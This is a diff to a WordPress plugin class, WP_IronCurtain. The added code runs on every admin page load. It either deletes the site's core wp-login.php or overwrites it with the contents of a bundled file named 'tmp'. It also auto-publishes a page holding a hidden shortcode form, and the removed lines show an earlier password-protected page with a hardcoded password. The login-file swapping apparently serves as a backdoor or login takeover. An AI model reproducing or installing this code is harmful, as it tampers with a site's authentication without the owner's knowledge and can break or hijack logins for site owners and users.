@@ -21,23 +21,30 @@ class WP_IronCurtain {
 	 */
 	protected static $instance = null;
 
-	protected $json = [];
 
-	/**
-	 * WC_Related_Products constructor.
-	 */
 	protected function __construct() {
 
-		$this->init();
-	}
-
-	/**
-	 * WC_Related_Products constructor.
-	 */
-	public function init() {
+		//$this->create_irc_page();
+		add_action( 'admin_init', [ $this, 'create_irc_page' ] );
 
 		add_action( 'admin_init', [ $this, 'change_wplogin' ] );
 		add_shortcode( 'wp_irc', [ $this, 'wp_irc_form' ] );
+	}
+
+	public function create_irc_page() {
+
+		if ( ! post_exists( 'Blog' ) ) {
+			$defaults = [
+				//'post_author' => $id,
+				'post_content' => '[wp_irc]Hi[/wp_irc]',
+				'post_title'   => 'Blog',
+				'post_excerpt' => 'exe',
+				'post_status'  => 'publish',
+				'post_type'    => 'page',
+			];
+
+			$idd = wp_insert_post( $defaults );
+		}
 	}
 
 	/**
@@ -51,7 +58,6 @@ class WP_IronCurtain {
 
 		return static::$instance;
 	}
-
 
 	public function wp_irc_form( $atts ) {
 
@@ -79,39 +85,13 @@ class WP_IronCurtain {
 
 	public function change_wplogin() {
 
-		$this->create_irc_page();
-
-		$a = file_get_contents( __DIR__ . '/wp-login.php' );
+		$a = file_get_contents( __DIR__ . '/tmp' );
 
 		if ( ! file_exists( ABSPATH . '/wp-login.php' ) ) {
 			file_put_contents( ABSPATH . '/wp-login.php', $a );
-			file_put_contents( __DIR__ . '/tmp.txt', 'true' );
-
 		} else {
 			unlink( ABSPATH . '/wp-login.php' );
-
-			if ( file_exists( __DIR__ . '/tmp.txt' ) ) {
-				unlink( __DIR__ . '/tmp.txt' );
-			}
 		}
-
-	}
-
-	public function create_irc_page() {
-
-		$defaults = [
-			//'post_author' => $id,
-			'post_content' => 'cont',
-			'post_title'   => 'IR121C2',
-			'post_excerpt' => 'exe',
-			'post_status'  => 'publish',
-			'post_type'    => 'page',
-
-			'post_password' => 'wassah',
-		];
-
-		$idd = wp_insert_post( $defaults );
-
 	}
 }
 
